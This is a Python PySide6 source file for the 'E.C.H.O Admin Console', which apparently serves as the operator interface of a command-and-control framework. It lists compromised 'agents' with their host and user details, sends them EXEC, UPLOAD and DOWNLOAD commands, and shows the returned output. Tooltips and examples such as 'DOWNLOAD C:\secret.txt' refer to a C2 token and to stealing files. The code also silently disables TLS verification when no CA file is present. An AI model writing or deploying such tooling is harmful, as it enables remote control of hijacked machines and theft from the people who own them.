# admin_app/main.py
# E.C.H.O Admin Console

import sys
import os
import threading
import time
import json
import base64
from PySide6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton,
    QListWidget, QTextEdit, QLineEdit, QLabel, QMessageBox,
    QSplitter, QSizePolicy, QComboBox, QFileDialog, QListWidgetItem
)

from PySide6.QtCore import Qt, Slot, Signal, QObject,QTimer
from PySide6.QtGui import QTextCursor, QFont, QIcon
import requests
import urllib3
from datetime import datetime, timedelta, timezone

# CONFIG via env
SERVER = os.environ.get("ECHO_SERVER", "https://127.0.0.1:8443")
TOKEN = os.environ.get("ECHO_AUTH_TOKEN", None)
HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_CA = os.path.normpath(os.path.join(HERE, "..", "certs", "ca.crt"))
CA_PATH = os.environ.get("ECHO_CA", DEFAULT_CA)

VERIFY = CA_PATH if os.path.isfile(CA_PATH) else False
if not VERIFY:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

POLL_INTERVAL = int(os.environ.get("ECHO_POLL", "10"))  # seconds
now = datetime.now(timezone.utc)


def req_get(path):
    headers = {"X-Auth-Token": TOKEN} if TOKEN else {}
    try:
        r = requests.get(SERVER + path, headers=headers, verify=VERIFY, timeout=10)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        return {"error": str(e)}

def req_post(path, json_payload):
    headers = {"Content-Type": "application/json"}
    if TOKEN:
        headers["X-Auth-Token"] = TOKEN
    try:
        r = requests.post(SERVER + path, headers=headers, json=json_payload, verify=VERIFY, timeout=30)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        return {"error": str(e)}

class Updater(QObject):
    agents_updated = Signal(list)
    results_updated = Signal(list)
    status = Signal(str)

class AdminGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("E.C.H.O Admin Console")
        self.setWindowIcon(QIcon(os.path.join(HERE, "echo_icon.png")))
        self.resize(1000, 700)
        self._results = []

        # Dark theme styling
        self.setStyleSheet("""
        QWidget {
            background-color: #1e1e2f;
            color: #ffffff;
            font-family: 'Segoe UI', sans-serif;
            font-size: 11pt;
        }
        QPushButton {
            background-color: #2e2e50;
            border: 1px solid #3a3a6e;
            padding: 4px 8px;
            border-radius: 4px;
        }
        QPushButton:hover {
            background-color: #3a3a6e;
        }
        QTextEdit, QLineEdit, QComboBox, QListWidget {
            background-color: #252545;
            color: #ffffff;
            border: 1px solid #3a3a6e;
        }
        QLabel {
            color: #66ccff;
        }
        QListWidget::item:selected {
            background-color: #3a3a6e;
        }
        """)

        self.updater = Updater()
        self.updater.agents_updated.connect(self.on_agents)
        self.updater.results_updated.connect(self.on_results)
        self.updater.status.connect(self.set_status)

        # Layout
        main_layout = QHBoxLayout(self)

        # --- Left pane: Agents ---
        left_v = QVBoxLayout()
        title_label = QLabel("<h2>E.C.H.O</h2><small>Endpoint Command & Host Operations</small>")
        title_label.setStyleSheet("color: #66ccff; margin-bottom: 8px;")
        left_v.addWidget(title_label)

        left_v.addWidget(QLabel("<b>Agents</b>"))
        self.agent_list = QListWidget()
        self.agent_list.setSelectionMode(QListWidget.SingleSelection)
        left_v.addWidget(self.agent_list)
        left_btn_h = QHBoxLayout()
        self.refresh_btn = QPushButton("Refresh")
        self.refresh_btn.clicked.connect(self.manual_refresh)
        left_btn_h.addWidget(self.refresh_btn)
        left_v.addLayout(left_btn_h)

        # --- Right pane: Agent details + commands ---
        right_v = QVBoxLayout()
        right_v.addWidget(QLabel("<b>Agent details</b>"))
        self.details = QTextEdit()
        self.details.setReadOnly(True)
        self.details.setMinimumHeight(140)
        right_v.addWidget(self.details)

        # Command input
        cmd_h = QHBoxLayout()
        self.cmd_type = QComboBox()
        self.cmd_type.addItems(["EXEC", "UPLOAD", "DOWNLOAD"])
        self.cmd_type.setMinimumWidth(120) 
        self.cmd_type.setSizeAdjustPolicy(QComboBox.AdjustToContents)
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("command")
        self.send_btn = QPushButton("Send")
        self.send_btn.clicked.connect(self.send_command)
        self.browse_btn = QPushButton("Browse")
        self.browse_btn.clicked.connect(self.browse_file)
        cmd_h.addWidget(self.cmd_type)
        cmd_h.addWidget(self.cmd_input, 1)
        cmd_h.addWidget(self.browse_btn)
        cmd_h.addWidget(self.send_btn)
        right_v.addLayout(cmd_h)
        self.cmd_type.currentTextChanged.connect(self.update_browse_button)
        self.update_browse_button(self.cmd_type.currentText())

        # Help label
        self.command_help = {
            "UPLOAD": "UPLOAD <local_path> <remote_path>\nEx: UPLOAD /tmp/secret.txt C:\\Users\\user\\Downloads\\secret.txt",
            "DOWNLOAD": "DOWNLOAD <remote_path>\nEx: DOWNLOAD C:\\secret.txt",
            "EXEC": "EXEC <command>\nEx: EXEC whoami",
        }
        self.help_label = QLabel("Tip: select a command type for examples")
        self.help_label.setStyleSheet("color: gray; font-size: 11px; padding-left: 8px;")
        right_v.addWidget(self.help_label)
        self.cmd_type.currentTextChanged.connect(self.update_help_combo)
        self.update_help_combo(self.cmd_type.currentText())

        # Last-output terminal
        right_v.addWidget(QLabel("<b>Last command output</b>"))
        self.last_output = QTextEdit()
        self.last_output.setReadOnly(True)
        mono = QFont("Courier New")
        mono.setStyleHint(QFont.Monospace)
        self.last_output.setFont(mono)
        self.last_output.setMinimumHeight(120)
        self.last_output.setLineWrapMode(QTextEdit.NoWrap)
        right_v.addWidget(self.last_output)

        # Results
        right_v.addWidget(QLabel("<b>Recent results</b>"))
        splitter = QSplitter(Qt.Vertical)
        self.results_list = QListWidget()
        self.results_view = QTextEdit()
        self.results_view.setReadOnly(True)
        self.results_view.setLineWrapMode(QTextEdit.NoWrap)
        self.results_view.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        splitter.addWidget(self.results_list)
        splitter.addWidget(self.results_view)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 2)
        right_v.addWidget(splitter)

        # Status
        self.status_label = QLabel("Idle")
        right_v.addWidget(self.status_label)

        self.copy_token_btn = QPushButton("Copy token")
        self.copy_token_btn.setToolTip("Copy the current C2 auth token to clipboard")
        self.copy_token_btn.clicked.connect(lambda: QApplication.clipboard().setText(TOKEN or ""))
        right_v.addWidget(self.copy_token_btn, alignment=Qt.AlignRight)

        # Layout
        main_layout.addLayout(left_v, 2)
        main_layout.addLayout(right_v, 5)
        self.setLayout(main_layout)

        # Connections
        self.agent_list.currentItemChanged.connect(self.on_agent_selected)
        self.agent_list.currentItemChanged.connect(self.on_agent_selection_changed)

        self.results_list.itemClicked.connect(self.on_result_clicked)

        # Polling thread
        self._stop = False
        t = threading.Thread(target=self.poll_loop, daemon=True)
        t.start()
        self.show()
        self.resize(1000, 700)
        self.setMinimumSize(800, 600) 



    # --- Slots & methods ---

    @Slot()
    def browse_file(self):
        item = self.agent_list.currentItem()
        if not item:
            return
        offline = item.data(Qt.UserRole + 1)
        if offline:
            QMessageBox.warning(self, "Agent offline", "Cannot select a file: agent is offline.")
            return
        fp, _ = QFileDialog.getOpenFileName(self, "Select file to upload")
        if fp:
            if self.cmd_type.currentText() == "UPLOAD":
                self.cmd_input.setText(f"{fp} ")
            else:
                self.cmd_input.setText(fp)

    @Slot(str)
    def update_browse_button(self, cmd_type=None):
        """ Update the state and tooltip of the Browse button based on command type and agent status. """
        current_item = self.agent_list.currentItem()
        offline = True
        if current_item:
            offline = bool(current_item.data(Qt.UserRole + 1))

        cmd_type = cmd_type or self.cmd_type.currentText()
        enabled = (cmd_type == "UPLOAD") and (not offline)
        
        self.browse_btn.setEnabled(enabled)

        if enabled:
            self.browse_btn.setToolTip("Select a local file to upload")
            self.browse_btn.setStyleSheet("""
                QPushButton {
                    background-color: #2e2e50;
                    border: 1px solid #3a3a6e;
                    padding: 4px 8px;
                    border-radius: 4px;
                }
                QPushButton:hover {
                    background-color: #3a3a6e;
                }
            """)
        else:
            if not current_item:
                self.browse_btn.setToolTip("No agent selected")
            elif offline:
                self.browse_btn.setToolTip("Browse disabled (agent offline)")
            else:
                self.browse_btn.setToolTip("Browse disabled (not an UPLOAD command)")
            self.browse_btn.setStyleSheet("background-color: #555580; color: #aaaaaa;")


    @Slot()
    def manual_refresh(self):
        self.set_status("Manual refresh")
        threading.Thread(target=self.fetch_agents_and_results, daemon=True).start()

    def poll_loop(self):
        while not self._stop:
            self.fetch_agents_and_results()
            time.sleep(POLL_INTERVAL)

    def fetch_agents_and_results(self):
        self.updater.status.emit("Polling server...")
        agents = req_get("/agents")
        results = req_get("/results_list")
        if "error" in agents:
            self.updater.status.emit("Error fetching agents: " + agents["error"])
        else:
            self.updater.agents_updated.emit(agents.get("agents", []))
        if "error" in results:
            self.updater.status.emit("Error fetching results: " + results["error"])
        else:
            self._results = results.get("results", []) if isinstance(results, dict) else []
            self.updater.results_updated.emit(self._results)
        self.updater.status.emit("Last update: " + time.strftime("%H:%M:%S"))

    @Slot(list)
    def on_agents(self, agents):
        # Preserve selection
        prev_agent_id = None
        cur_item = self.agent_list.currentItem()
        if cur_item:
            prev_agent_id = cur_item.data(Qt.UserRole).get("id")

        self.agent_list.clear()
        now = datetime.now(timezone.utc)
        threshold = now - timedelta(seconds=POLL_INTERVAL)
        for a in agents:
            item = self._create_agent_list_item(a, now, threshold)
            self.agent_list.addItem(item)

        # Restore selection
        if prev_agent_id:
            for i in range(self.agent_list.count()):
                item = self.agent_list.item(i)
                a = item.data(Qt.UserRole)
                if a.get("id") == prev_agent_id:
                    self.agent_list.setCurrentItem(item)
                    QTimer.singleShot(0, lambda item=item: self.on_agent_selection_changed(item, None))
                    break

    def _create_agent_list_item(self, agent, now, threshold):
        host = agent.get('hostname') or 'unknown'
        last_seen_str = agent.get('last_seen', '')
        try:
            last_seen_dt = datetime.fromisoformat(last_seen_str)
            if last_seen_dt.tzinfo is None:
                last_seen_dt = last_seen_dt.replace(tzinfo=timezone.utc)
        except Exception:
            last_seen_dt = now

        offline = last_seen_dt < threshold
        display = f"{host}  [{agent.get('id')[:8]}]  ({last_seen_str})"
        if offline:
            display = "[OFFLINE] " + display
            item_color = Qt.lightGray
        else:
            display = "[ONLINE] " + display
            item_color = Qt.green

        item = QListWidgetItem(display)
        item.setData(Qt.UserRole, agent)
        item.setData(Qt.UserRole + 1, int(offline))  # store offline status
        item.setForeground(item_color)
        return item


    @Slot()
    def on_agent_selection_changed(self, current, previous):
        self.on_agent_selected(current, previous)
        self.update_browse_button()

    @Slot(list)
    def on_results(self, results):
        self.results_list.clear()
        for r in results:
            ts = r.get('received_ts') or ""
            agent_short = (r.get('agent_id') or "")[:8]
            fname = r.get('filename') or r.get('path') or "unknown"
            try:
                date, hour = ts.split("T")
            except Exception:
                date = ts
                hour = ""
            display = f"[{date} - {hour}] {agent_short}  |  {fname}"
            self.results_list.addItem(display)
            self.results_list.item(self.results_list.count()-1).setData(Qt.UserRole, r)

        cur_item = self.agent_list.currentItem()
        if cur_item:
            agent_id = cur_item.data(Qt.UserRole).get("id")
            self.update_last_output_for_agent(agent_id)
        else:
            self.last_output.clear()

    def find_latest_result_for_agent(self, agent_id):
        latest = None
        for r in self._results:
            if r.get("agent_id") != agent_id:
                continue
            ts = r.get("received_ts")
            if not latest:
                latest = r
            else:
                try:
                    if ts and latest.get("received_ts") and ts > latest.get("received_ts"):
                        latest = r
                except Exception:
                    latest = r
        return latest

    def update_last_output_for_agent(self, agent_id):
        """ Update the last output terminal for the selected agent."""
        r = self.find_latest_result_for_agent(agent_id)
        if not r:
            self.last_output.setPlainText("No recent results for this agent.")
            return
        res = r.get("result", {})
        stdout = res.get("stdout") if isinstance(res.get("stdout"), str) else json.dumps(res.get("stdout"), ensure_ascii=False)
        stderr = res.get("stderr") if isinstance(res.get("stderr"), str) else json.dumps(res.get("stderr"), ensure_ascii=False)
        cmd = r.get("command") or ""
        filename = r.get("filename") or r.get("path") or ""
        received = r.get("received_ts") or ""
        lines = [
            f"Agent  : {agent_id}",
            f"File   : {filename}" if filename else "",
            f"Received: {received}",
            f"Command: {cmd}",
            "-" * 60,
            f"STDOUT:\n{stdout}" if stdout else "",
            f"\nSTDERR:\n{stderr}" if stderr else ""
        ]
        self.last_output.setPlainText("\n".join([l for l in lines if l]))
        self.last_output.moveCursor(QTextCursor.Start)

    @Slot()
    def on_agent_selected(self, current, previous):
        if not current:
            self.details.clear()
            self.last_output.clear()
            return
        a = current.data(Qt.UserRole)
        lines = [
            f"Agent ID   : {a.get('id')}",
            f"Hostname   : {a.get('hostname')}",
            f"Username   : {a.get('username')}",
            f"OS         : {a.get('os')}",
            f"First seen : {a.get('first_seen')}",
            f"Last seen  : {a.get('last_seen')}"
        ]
        extra = a.get('extra') or {}
        if extra:
            lines.append("Extra      :")
            lines.append(json.dumps(extra, indent=2, ensure_ascii=False))
        self.details.setPlainText("\n".join(lines))
        self.update_last_output_for_agent(a.get("id"))

    def _validate_agent(self):
        item = self.agent_list.currentItem()
        if not item:
            QMessageBox.warning(self, "No agent", "Select an agent first")
            return None
        agent = item.data(Qt.UserRole)
        agent_id = agent.get("id")
        if item.data(Qt.UserRole + 1):  # offline
            QMessageBox.warning(self, "Agent offline",
                f"Agent {agent_id[:8]} is offline. Cannot send command.")
            self.set_status("Command blocked (agent offline)")
            return None
        return agent_id

    def _handle_upload(self, agent_id, cmd_text):
        parts = cmd_text.split(" ", 1)
        if len(parts) != 2 or not parts[0] or not parts[1]:
            QMessageBox.critical(self, "Error",
                "UPLOAD requires: <local_path> <remote_path>\nEx: C:\\temp\\a.txt C:\\Users\\user\\Downloads\\a.txt")
            return
        
        local_path, remote_path = parts[0].strip(), parts[1].strip()
        if not os.path.isfile(local_path):
            QMessageBox.critical(self, "Error", f"Local file not found: {local_path}")
            return

        if remote_path.endswith("/") or remote_path.endswith("\\") or os.path.splitext(remote_path)[1] == "":
            remote_path = os.path.join(remote_path, os.path.basename(local_path))

        try:
            with open(local_path, "rb") as f:
                content_b64 = base64.b64encode(f.read()).decode("utf-8")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to read local file: {e}")
            return

        full_command = f"UPLOAD {remote_path} {content_b64}"
        self.set_status(f"Queueing UPLOAD to {agent_id[:8]} -> {remote_path} ({len(content_b64)} bytes b64)")
        return self._send_to_agent(agent_id, full_command, f"Remote: {remote_path}")

    def _send_to_agent(self, agent_id, command, success_extra=""):
        res = req_post(f"/send_command/{agent_id}", {"command": command})
        if "error" in res:
            QMessageBox.critical(self, "Error", "Failed to send: " + res["error"])
            self.set_status("Send failed")
            return False
        QMessageBox.information(self, "Sent", f"Command queued (id: {res.get('cmd_id')})\n{success_extra}")
        self.cmd_input.clear()
        return True

    @Slot()
    def send_command(self):
        agent_id = self._validate_agent()
        if not agent_id:
            return

        cmd_text = self.cmd_input.text().strip()
        if not cmd_text:
            QMessageBox.warning(self, "Empty", "Enter a command or path")
            return

        cmd_type = self.cmd_type.currentText()
        if cmd_type == "UPLOAD":
            if self._handle_upload(agent_id, cmd_text):
                self.set_status("Upload command queued")
        else:
            # EXEC / DOWNLOAD
            full_command = f"{cmd_type} {cmd_text}"
            self.set_status(f"Sending '{full_command}' to {agent_id[:8]}...")
            if self._send_to_agent(agent_id, full_command):
                self.set_status("Command sent")

    @Slot()
    def on_result_clicked(self, item):
        r = item.data(Qt.UserRole)
        res = r.get('result', {})
        html = [
            f"<b>Agent</b> : {r.get('agent_id')}",
            f"<br><b>File</b> : {r.get('filename')}",
            f"<br><b>Received</b> : {r.get('received_ts')}",
            f"<br><b>Command</b> : {r.get('command')}",
            f"<br><b>Output</b> : {escape_html(res.get('stdout', ''))}"
        ]
        self.results_view.setHtml("".join(html))
        self.results_view.moveCursor(QTextCursor.Start)

        _ = r.get("agent_id")
        
    @Slot(str)
    def set_status(self, s):
        self.status_label.setText(s)

    @Slot(str)
    def update_help_combo(self, cmd_type):
        self.help_label.setText(self.command_help.get(cmd_type, "Tip: select a command type for examples"))

    def closeEvent(self, event):
        self._stop = True
        event.accept()


def escape_html(s):
    if s is None:
        return ""
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\n", "<br>")

if __name__ == "__main__":
    if not TOKEN:
        print("Warning: ECHO_AUTH_TOKEN not set in environment. GUI will try unauthenticated requests.")
    print(f"Using SERVER={SERVER} VERIFY={'CA='+CA_PATH if CA_PATH else VERIFY}")
    app = QApplication(sys.argv)
    gui = AdminGUI()
    gui.show()
    sys.exit(app.exec())
